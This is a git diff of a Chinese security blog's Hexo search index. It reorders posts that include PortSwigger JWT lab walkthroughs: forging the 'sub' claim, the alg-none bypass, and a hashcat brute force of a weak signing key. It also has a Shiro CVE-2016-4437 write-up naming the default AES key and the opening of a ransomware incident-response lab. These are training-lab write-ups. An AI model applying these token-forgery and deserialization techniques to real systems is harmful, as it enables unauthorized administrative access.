class="attr">dashboard_pwd</span> = <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
       <categories>
-        <category>Web安全</category>
+        <category>Intranet 安全</category>
       </categories>
       <tags>
-        <tag>API安全</tag>
+        <tag>内网穿透工具</tag>
       </tags>
   </entry>
   <entry>
@@ -210,21 +230,10 @@
       </tags>
   </entry>
   <entry>
-    <title>内网穿透工具FRP</title>
-    <url>/posts/fe1704c8.html</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>Intranet 安全</category>
-      </categories>
-      <tags>
-        <tag>内网穿透工具</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>本站hexo魔改</title>
     <url>/posts/ab21860c.html</url>
     <content><![CDATA[<h1 id="自定义文件"><a href="#自定义文件" class="headerlink" title="自定义文件"></a>自定义文件</h1><p>网上大部分魔改是通过修改主题文件，虽然快速直接，但是遇到主题更新会重置，因此博客通过添加自定义css和js文件实现的魔改即使主题更新也会保留。<br>创建的文件位置:<br>博客根目录下的source文件夹(不是themes下的source)创建js和css。<br><img src="/img/modify/touchjscss.png"></p>
-<h2 id="引入文件位置"><a href="#引入文件位置" class="headerlink" title="引入文件位置"></a>引入文件位置</h2><p><a href="https://blog.leonus.cn/2022/custom.html">https://blog.leonus.cn/2022/custom.html</a></p>
+<h2 id="引入文件位置"><a href="#引入文件位置" class="headerlink" title="引入文件位置"></a>引入文件位置</h2><p><a href="https://blog.leonus.cn/2022/custom.html">Hexo博客添加自定义css和js文件</a></p>
 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">  <span class="comment"># 自定义css</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;../css/loading.css?1&quot;&gt;</span></span><br><span class="line">      <span class="comment"># 静态文件后加个 ?任意内容 可以在每次更新后用户自动重新请求</span></span><br><span class="line">      <span class="comment"># 例如添加 ?1 ,在修改此文件后改成 ?2 ,用户访问你的网站时,不会使用本地的缓存,而是请求新的内容。没修改的话就不用动。</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;../css/transparency.css&quot;&gt;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;../css/social_iconfont.css&quot;&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">  <span class="comment"># 自定义js</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">async</span> <span class="string">src=&quot;/js/title_change.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#引入多个文件就直接复制一行更改文件名即可</span></span><br><span class="line">    <span class="comment"># - &lt;script src=&quot;/js/文件名&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="加载动画"><a href="#加载动画" class="headerlink" title="加载动画"></a>加载动画</h1><h2 id="loading动画步骤"><a href="#loading动画步骤" class="headerlink" title="loading动画步骤"></a>loading动画步骤</h2><p>满屏与 pace 同时启用<br><a href="https://blog.anheyu.com/posts/52d8.html">https://blog.anheyu.com/posts/52d8.html</a><br>修改加载动画。(script(async)使用异步加载防止加载其他页面时阻塞该脚本的加载;settimeout设置定时器防止过长的动画加载时间)</p>
@@ -240,13 +249,28 @@
 <p>修改主题配置文件_config.butterfly.yml的preloader项</p>
 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Loading Animation</span></span><br><span class="line"><span class="attr">preloader:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># source</span></span><br><span class="line">  <span class="comment"># 1. fullpage-loading</span></span><br><span class="line">  <span class="comment"># 2. pace (progress bar)</span></span><br><span class="line">  <span class="comment"># 3. all</span></span><br><span class="line">  <span class="attr">source:</span> <span class="number">1</span></span><br><span class="line">  <span class="comment"># pace theme (see https://codebyzach.github.io/pace/)</span></span><br><span class="line">  <span class="attr">pace_css_url:</span> <span class="string">/css/progress_bar.css</span></span><br><span class="line">  <span class="attr">avatar:</span> <span class="comment"># 自定义头像</span></span><br></pre></td></tr></table></figure>
 
-<h1 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h1><p><a href="https://blog.ccknbc.cc/posts/hexo-butterfly-algolia/">https://blog.ccknbc.cc/posts/hexo-butterfly-algolia/</a></p>
+<h1 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h1><p><a href="https://cloud.tencent.com/developer/article/2127727">Hexo + butterfly 使用 Alogolia 替代本地搜索</a></p>
 <h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
       <categories>
         <category>hexo</category>
       </categories>
       <tags>
         <tag>hexo魔改</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Portswigger-JWT-LAB-1</title>
+    <url>/posts/962f5710.html</url>
+    <content><![CDATA[<h1 id="未经验证的签名绕过JWT身份验证"><a href="#未经验证的签名绕过JWT身份验证" class="headerlink" title="未经验证的签名绕过JWT身份验证"></a>未经验证的签名绕过JWT身份验证</h1><p>未经验证的签名，即修改载荷发送至服务端不会对算法和签名进行验证从而绕过JWT身份认证</p>
+<h1 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h1><p>用户凭证: wiener:peter</p>
+<h1 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a>题目要求</h1><p> 修改会话令牌以访问&#x2F;admin处的管理面板，并删除用户carlos</p>
+<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>靶场页面<br><img src="/img/jwt/jwt1/index.png"><br>登录页面<br><img src="/img/jwt/jwt1/login.png"><br>登录抓包返回jwt令牌数据<br><img src="/img/jwt/jwt1/loginback.png"><br>查看jwt详细数据<br><img src="/img/jwt/jwt1/jwt.png"><br>抓包，访问My account功能点修改接口admin:GET &#x2F;my-account?id&#x3D;wiener为admin:GET &#x2F;admin，出现错误，显示:管理员界面仅在以管理员身份登录时可用<br><img src="/img/jwt/jwt1/adminerror.png"><br>修改sub值为admin或administrator成功<br><img src="/img/jwt/jwt1/adminjwt.png"><br>删除carlos(点击删除还会对jwt令牌认证，再次抓包修改jwt的sub值为administrator即可)<br><img src="/img/jwt/jwt1/delete.png"></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>JWT Vulnerabilitiy</tag>
       </tags>
   </entry>
   <entry>
@@ -294,12 +318,14 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Portswigger-JWT-LAB-1</title>
-    <url>/posts/962f5710.html</url>
-    <content><![CDATA[<h1 id="未经验证的签名绕过JWT身份验证"><a href="#未经验证的签名绕过JWT身份验证" class="headerlink" title="未经验证的签名绕过JWT身份验证"></a>未经验证的签名绕过JWT身份验证</h1><p>未经验证的签名，即修改载荷发送至服务端不会对算法和签名进行验证从而绕过JWT身份认证</p>
+    <title>Portswigger-JWT-LAB-3</title>
+    <url>/posts/d0e26b4a.html</url>
+    <content><![CDATA[<h1 id="通过弱签名密钥绕过JWT身份验证"><a href="#通过弱签名密钥绕过JWT身份验证" class="headerlink" title="通过弱签名密钥绕过JWT身份验证"></a>通过弱签名密钥绕过JWT身份验证</h1><p>当jwt令牌使用了一个弱的密钥进行签名和验证令牌，可以通过对密钥暴力破解获取加密密钥并对修改过的header和payload进行签名</p>
 <h1 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h1><p>用户凭证: wiener:peter</p>
 <h1 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a>题目要求</h1><p> 修改会话令牌以访问&#x2F;admin处的管理面板，并删除用户carlos</p>
-<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>靶场页面<br><img src="/img/jwt/jwt1/index.png"><br>登录页面<br><img src="/img/jwt/jwt1/login.png"><br>登录抓包返回jwt令牌数据<br><img src="/img/jwt/jwt1/loginback.png"><br>查看jwt详细数据<br><img src="/img/jwt/jwt1/jwt.png"><br>抓包，访问My account功能点修改接口admin:GET &#x2F;my-account?id&#x3D;wiener为admin:GET &#x2F;admin，出现错误，显示:管理员界面仅在以管理员身份登录时可用<br><img src="/img/jwt/jwt1/adminerror.png"><br>修改sub值为admin或administrator成功<br><img src="/img/jwt/jwt1/adminjwt.png"><br>删除carlos(点击删除还会对jwt令牌认证，再次抓包修改jwt的sub值为administrator即可)<br><img src="/img/jwt/jwt1/delete.png"></p>
+<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>还是原来的数据包修改jwt令牌数据，但这次需要爆破出弱密钥并对头部和payload签名<br>可以使用hashcat或jwt_tools弱密钥爆破，hashcat对电脑cpu和gpu要求较高。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 16500 -a 0 eyJraWQiOiJiMzk4MjNjYi0zNzQ5LTRhOTEtYmIwYS00NzQzNzkzMDE1YTYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczMjEwMDAyNSwic3ViIjoid2llbmVyIn0.-A3dSmWee8i3WbAkBL9hDj92KoYuaH0WKLXfV-nb5SM</span><br></pre></td></tr></table></figure>
+<p>获得密钥为secret1，使用jwt.io重新签名<br><img src="/img/jwt/jwt3/jwt.png"><br>将伪造过后的令牌替换并访问admin接口<br><img src="/img/jwt/jwt3/admin.png"></p>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -315,23 +341,6 @@
 <h1 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h1><p>用户凭证: wiener:peter</p>
 <h1 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a>题目要求</h1><p> 修改会话令牌以访问&#x2F;admin处的管理面板，并删除用户carlos</p>
 <h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>思路还是一样，使用jwt令牌修改为admin进入admin界面，但需要对alg值修改为none，并删除签名部分<br><img src="/img/jwt/jwt2/jwt.png"><br>删除用户同理</p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>JWT Vulnerabilitiy</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Portswigger-JWT-LAB-3</title>
-    <url>/posts/d0e26b4a.html</url>
-    <content><![CDATA[<h1 id="通过弱签名密钥绕过JWT身份验证"><a href="#通过弱签名密钥绕过JWT身份验证" class="headerlink" title="通过弱签名密钥绕过JWT身份验证"></a>通过弱签名密钥绕过JWT身份验证</h1><p>当jwt令牌使用了一个弱的密钥进行签名和验证令牌，可以通过对密钥暴力破解获取加密密钥并对修改过的header和payload进行签名</p>
-<h1 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h1><p>用户凭证: wiener:peter</p>
-<h1 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a>题目要求</h1><p> 修改会话令牌以访问&#x2F;admin处的管理面板，并删除用户carlos</p>
-<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>还是原来的数据包修改jwt令牌数据，但这次需要爆破出弱密钥并对头部和payload签名<br>可以使用hashcat或jwt_tools弱密钥爆破，hashcat对电脑cpu和gpu要求较高。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 16500 -a 0 eyJraWQiOiJiMzk4MjNjYi0zNzQ5LTRhOTEtYmIwYS00NzQzNzkzMDE1YTYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczMjEwMDAyNSwic3ViIjoid2llbmVyIn0.-A3dSmWee8i3WbAkBL9hDj92KoYuaH0WKLXfV-nb5SM</span><br></pre></td></tr></table></figure>
-<p>获得密钥为secret1，使用jwt.io重新签名<br><img src="/img/jwt/jwt3/jwt.png"><br>将伪造过后的令牌替换并访问admin接口<br><img src="/img/jwt/jwt3/admin.png"></p>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -554,20 +563,6 @@
       </tags>
   </entry>
   <entry>
-    <title>npm更新报错</title>
-    <url>/posts/63beea23.html</url>
-    <content><![CDATA[<h1 id="注"><a href="#注" class="headerlink" title="注"></a>注</h1><p>1.更新npm可能node版本不一致，导致命令无法使用<br>2.在 <a href="https://nodejs.org/zh-cn/download/releases/">https://nodejs.org/zh-cn/download/releases/</a> 内可查看node对应的npm版本<br>3.npm -g install npm @npm 安装指定npm版本号<br>4.若出现报错说明npm存在旧的npm缓存，或旧的npm环境，需将之前C盘Roaming下的npm，npm-cache两个文件删除<br>5.删除之后重新执行npm -g install npm @npm版本号<br>6.再次查看npm版本确认是否更换完成</p>
-<h1 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Daiyamondo&gt;npm install -g npm</span><br><span class="line">npm ERR! code EBADENGINE</span><br><span class="line">npm ERR! engine Unsupported engine</span><br><span class="line">npm ERR! engine Not compatible with your version of node/npm: npm@10.9.0</span><br><span class="line">npm ERR! notsup Not compatible with your version of node/npm: npm@10.9.0</span><br><span class="line">npm ERR! notsup Required: &#123;&quot;node&quot;:&quot;^18.17.0 || &gt;=20.5.0&quot;&#125;</span><br><span class="line">npm ERR! notsup Actual:   &#123;&quot;npm&quot;:&quot;8.1.2&quot;,&quot;node&quot;:&quot;v16.13.1&quot;&#125;</span><br><span class="line"></span><br><span class="line">npm ERR! A complete log of this run can be found in:</span><br><span class="line">npm ERR!     C:\Users\Daiyamondo\AppData\Local\npm-cache\_logs\2024-10-24T06_31_00_310Z-debug.log</span><br></pre></td></tr></table></figure>
-<h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Daiyamondo&gt;,npm install --force -g npm</span><br><span class="line">npm WARN using --force Recommended protections disabled.</span><br><span class="line">npm WARN install Forcing global npm install with incompatible version 10.9.0 into node v16.13.1</span><br><span class="line"></span><br><span class="line">added 3 packages in 5s</span><br><span class="line"></span><br><span class="line">3 packages are looking for funding</span><br><span class="line">  run `npm fund` for details</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>报错</category>
-      </categories>
-      <tags>
-        <tag>npm报错</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>pyenv 简单使用记录</title>
     <url>/posts/199c3661.html</url>
     <content><![CDATA[<h1 id="项目下载"><a href="#项目下载" class="headerlink" title="项目下载"></a>项目下载</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git pyenv项目（我是下载pyenv然后解压到root下，plugin插件没有virtualenv-init，后面用git下载）</span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ~]$ git clone https://github.com/pyenv/pyenv.git ~/.pyenv</span><br></pre></td></tr></table></figure>
@@ -599,35 +594,6 @@
       </categories>
       <tags>
         <tag>pyenv</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>QEMU镜像格式转换工具</title>
-    <url>/posts/41bf34a5.html</url>
-    <content><![CDATA[<h1 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h1><p>qemu-img工具支持RAW、QCOW2、QCOW1、VMDK、VDI、VHD、VHDX或QED格式的镜像相互转换。<br>qemu-img工具不支持直接将ISO镜像转换为RAW、VHD和QCOW2格式。<br>将VHD格式转换为其他格式或者将其他文件格式转换为VHD格式时，需使用vpc参数代替VHD格式，否则可能造成qemu-img工具无法识别VHD镜像格式导致转换失败</p>
-<h1 id="windows系统"><a href="#windows系统" class="headerlink" title="windows系统"></a>windows系统</h1><h1 id="安装qemu"><a href="#安装qemu" class="headerlink" title="安装qemu"></a>安装qemu</h1><p><a href="https://qemu.weilnetz.de/w64/">https://qemu.weilnetz.de/w64/</a><br>qemu-w64-setup-20240903.exe </p>
-<h2 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h2><p>系统变量Path添加qemu安装路径</p>
-<h2 id="测试环境变量是否配置成功"><a href="#测试环境变量是否配置成功" class="headerlink" title="测试环境变量是否配置成功"></a>测试环境变量是否配置成功</h2><p>cmd输入</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-img --help</span><br></pre></td></tr></table></figure>
-<div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">QCOW2转换为RAW格式</button><button type="button" class="tab">VHD转换为RAW格式</button><button type="button" class="tab">RAW转换为VMDK格式</button></div><div class="tab-contents"><div class="tab-item-content active"><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-img convert -f qcow2 -O raw centos.qcow2 centos.raw</span><br></pre></td></tr></table></figure></div><div class="tab-item-content"><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-img convert -f vpc -O raw centos.vhd centos.raw</span><br></pre></td></tr></table></figure></div><div class="tab-item-content"><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-img convert -f raw -O vmdk centos.raw centos.vmdk</span><br></pre></td></tr></table></figure></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div>
-]]></content>
-      <categories>
-        <category>格式转换工具</category>
-      </categories>
-      <tags>
-        <tag>镜像转换</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>scp简单使用举例</title>
-    <url>/posts/b7234643.html</url>
-    <content><![CDATA[<p>scp（secure copy） 需要上传的文件  上传到的用户（比如root账户或其他创建的账户）@服务器IP:目标文件夹</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~kali/Desktop/tools/py-env]</span><br><span class="line">└─# scp Python-3.10.0.tgz python@xxx.xxx.xxx.xxx:~/.pyenv/cache</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>命令行工具</category>
-      </categories>
-      <tags>
-        <tag>文件传输</tag>
       </tags>
   </entry>
   <entry>
@@ -760,9 +726,21 @@
       </tags>
   </entry>
   <entry>
+    <title>scp简单使用举例</title>
+    <url>/posts/b7234643.html</url>
+    <content><![CDATA[<p>scp（secure copy） 需要上传的文件  上传到的用户（比如root账户或其他创建的账户）@服务器IP:目标文件夹</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~kali/Desktop/tools/py-env]</span><br><span class="line">└─# scp Python-3.10.0.tgz python@xxx.xxx.xxx.xxx:~/.pyenv/cache</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>命令行工具</category>
+      </categories>
+      <tags>
+        <tag>文件传输</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>shiro反序列化漏洞(CVE-2016-4437)复现</title>
     <url>/posts/79c4731b.html</url>
-    <content><![CDATA[<p>摘:<a href="https://blog.csdn.net/dreamthe/article/details/124390531">https://blog.csdn.net/dreamthe/article/details/124390531</a></p>
+    <content><![CDATA[<p><a href="https://blog.csdn.net/dreamthe/article/details/124390531">详细shiro漏洞复现及利用方法</a></p>
 <h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>Apache Shiro 框架提供了记住密码（RememberMe）的功能，用户登录成功后会将用户信息加密，加密过程:用户信息&#x3D;&gt;序列化 &#x3D;&gt; AES加密 &#x3D;&gt;base64编码&#x3D;&gt; RememberMe Cookie值。如果用户勾选记住密码，那么在请求中会携带cookie，并且将加密信息存放在cookie的rememberMe字段里面，在服务端收到请求对rememberMe值，先base64解码然后AES解密再反序列化，这个加密过程如果我们知道AES加密的密钥，那么我们把用户信息替换成恶意命令，就导致了反序列化RCE漏洞。在shiro版本&lt;&#x3D;1.2.4中使用了默认密钥kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;，更容易触发 RCE 漏洞。</p>
 <p>所以我们Payload产生的过程：<br>命令&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;RememberMe Cookie 值</p>
 <h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>shiro版本 &lt;&#x3D; 1.2.4</p>
@@ -795,6 +773,20 @@
       </categories>
       <tags>
         <tag>sql-inject</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>npm更新报错</title>
+    <url>/posts/63beea23.html</url>
+    <content><![CDATA[<h1 id="注"><a href="#注" class="headerlink" title="注"></a>注</h1><p>1.更新npm可能node版本不一致，导致命令无法使用<br>2.<a href="https://nodejs.org/zh-cn/download/releases/">在node-js官网内可查看node对应的npm版本</a><br>3.npm -g install npm @npm 安装指定npm版本号<br>4.若出现报错说明npm存在旧的npm缓存，或旧的npm环境，需将之前C盘Roaming下的npm，npm-cache两个文件删除<br>5.删除之后重新执行npm -g install npm @npm版本号<br>6.再次查看npm版本确认是否更换完成</p>
+<h1 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Daiyamondo&gt;npm install -g npm</span><br><span class="line">npm ERR! code EBADENGINE</span><br><span class="line">npm ERR! engine Unsupported engine</span><br><span class="line">npm ERR! engine Not compatible with your version of node/npm: npm@10.9.0</span><br><span class="line">npm ERR! notsup Not compatible with your version of node/npm: npm@10.9.0</span><br><span class="line">npm ERR! notsup Required: &#123;&quot;node&quot;:&quot;^18.17.0 || &gt;=20.5.0&quot;&#125;</span><br><span class="line">npm ERR! notsup Actual:   &#123;&quot;npm&quot;:&quot;8.1.2&quot;,&quot;node&quot;:&quot;v16.13.1&quot;&#125;</span><br><span class="line"></span><br><span class="line">npm ERR! A complete log of this run can be found in:</span><br><span class="line">npm ERR!     C:\Users\Daiyamondo\AppData\Local\npm-cache\_logs\2024-10-24T06_31_00_310Z-debug.log</span><br></pre></td></tr></table></figure>
+<h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Daiyamondo&gt;,npm install --force -g npm</span><br><span class="line">npm WARN using --force Recommended protections disabled.</span><br><span class="line">npm WARN install Forcing global npm install with incompatible version 10.9.0 into node v16.13.1</span><br><span class="line"></span><br><span class="line">added 3 packages in 5s</span><br><span class="line"></span><br><span class="line">3 packages are looking for funding</span><br><span class="line">  run `npm fund` for details</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>报错</category>
+      </categories>
+      <tags>
+        <tag>npm报错</tag>
       </tags>
   </entry>
   <entry>
@@ -906,6 +898,144 @@
       </categories>
       <tags>
         <tag>sql-inject</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulntarget-N勒索病毒靶场练习</title>
+    <url>/posts/4fea4d13.html</url>
+    <content><![CDATA[<h1 id="项目背景"><a href="#项目背景" class="headerlink" title="项目背景"></a>项目背景</h1><p><a href="https://blog.csdn.net/csdnmmd/article/details/139614037">vulntarget-n靶场搭建&amp; 打靶流程</a><br> vulntarget-n是一个模拟全球化勒索病毒高发环境下的应急响应和取证分析案例，其模拟了一个正常运行的业务服务被勒索病毒攻击的情景：<br>    01、客户在阿里云部署的业务环境<br>    02、今天突然发现首页变成了一个勒索的界面，要求用户支付赎金以解密数据<br>    03、客户发现其中部分重要文件被加密为.vulntarget结尾<br>随即客户要你进行应急响应并取证分析，因为是阿里云的ECS，客户将阿里云ECS实例镜像导出到本地，要求你在明天分析出结果。<br>具体要求如下：<br>    01、分析攻击事件是如何发生的，请给出攻击画像<br>    02、解密勒索<br>    03、恢复原来的index.jsp页面，恢复正常的web服务</p>
+<h1 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h1><p>阿里云ECS服务器-ubuntu vmdk镜像<br>账号 root<br>密码 Vulntarget@123(输入密码可shift+对应字符大写)</p>
+<h1 id="瞎找"><a href="#瞎找" class="headerlink" title="瞎找"></a>瞎找</h1><h2 id="xshell连接"><a href="#xshell连接" class="headerlink" title="xshell连接"></a>xshell连接</h2><p>单纯的ubuntu命令行看的眼瞎，用xshell工具连接好看点，也方便使用scp双向传输文件<br>先确定是否有相关开放的端口可供连接，看到开放了22端口，盲猜是不是端口爆破进来(虽然密码看着挺复杂的)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@iZj6c6hytildlalnu0cwt4Z:~/history# netstat -ntulp</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      570/systemd-resolve </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      756/sshd: /usr/sbin </span><br><span class="line">tcp        0      0 127.0.0.1:6010          0.0.0.0:*               LISTEN      1284/sshd: root@pts </span><br><span class="line">tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      703/java            </span><br><span class="line">tcp6       0      0 :::8009                 :::*                    LISTEN      703/java            </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      703/java            </span><br><span class="line">udp        0      0 127.0.0.53:53           0.0.0.0:*                           570/systemd-resolve </span><br><span class="line">udp        0      0 192.168.80.138:68       0.0.0.0:*                           642/systemd-network </span><br><span class="line">udp        0      0 127.0.0.1:323           0.0.0.0:*                           670/chronyd         </span><br><span class="line">udp6       0      0 ::1:323                 :::*                                670/chronyd </span><br></pre></td></tr></table></figure>
+<p>xshell连上还是好看多了<br><img src="/img/vulntargetN/xshell.png"></p>
+<h2 id="历史记录"><a href="#历史记录" class="headerlink" title="历史记录"></a>历史记录</h2><p>康康管理员或攻击者都用啥命令<br>两百多行啊，太多了，直接 history &gt;history.txt放文本里拿出来慢慢分析</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">oot@iZj6c6hytildlalnu0cwt4Z:~/history# cat history.txt </span><br><span class="line">    1      1  apt update &amp;&amp; apt install openjdk-8-jdk &amp;&amp; apt install unzip -y</span><br><span class="line">    2      2  vim /etc/profile</span><br><span class="line">    3      3  source /etc/profile</span><br><span class="line">    4      4  wget https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.zip</span><br><span class="line">    5      5  unzip apache-tomcat-7.0.79.zip</span><br><span class="line">    6      6  mv apache-tomcat-7.0.79 /opt/tomcatmv apache-tomcat-7.0.79 /opt/tomcat</span><br><span class="line">    7      7  mv apache-tomcat-7.0.79 /opt/tomcat</span><br><span class="line">    8      8  chmod +x /opt/tomcat/bin/*.sh</span><br><span class="line">    9      9  ls</span><br><span class="line">   10     10  history </span><br></pre></td></tr></table></figure>
+<h2 id="error小插曲"><a href="#error小插曲" class="headerlink" title="error小插曲"></a>error小插曲</h2><p>用scp将history文件传输至kali时出现以下问题</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@iZj6c6hytildlalnu0cwt4Z:~/history# scp history.txt kali@192.168.80.129:~/home/kali/desktop</span><br><span class="line">ssh: connect to host 192.168.80.129 port 22: Connection refused</span><br><span class="line">lost connection</span><br></pre></td></tr></table></figure>
+<p>可能的原因：<br><strong>SSH服务未运行</strong>(最后排查到，淦)</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# systemctl status ssh              </span><br><span class="line">○ ssh.service - OpenBSD Secure Shell server</span><br><span class="line">     Loaded: loaded (/lib/systemd/system/ssh.service; disabled; vendor preset: disabled)</span><br><span class="line">     Active: inactive (dead)</span><br><span class="line">       Docs: man:sshd(8)</span><br><span class="line">             man:sshd_config(5)</span><br><span class="line">                                                                                                                                                                                                                                                                     </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# systemctl restart ssh   </span><br><span class="line">                                                                                                                                                                                                                                                                     </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# systemctl status ssh </span><br><span class="line">● ssh.service - OpenBSD Secure Shell server</span><br><span class="line">     Loaded: loaded (/lib/systemd/system/ssh.service; disabled; vendor preset: disabled)</span><br><span class="line">     Active: active (running) since Mon 2024-11-04 02:55:45 EST; 2s ago</span><br><span class="line">       Docs: man:sshd(8)</span><br><span class="line">             man:sshd_config(5)</span><br></pre></td></tr></table></figure>
+<p>端口未开放</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ufw allow 22/tcp</span><br></pre></td></tr></table></figure>
+<p>网络问题</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping 192.168.80.129</span><br></pre></td></tr></table></figure>
+
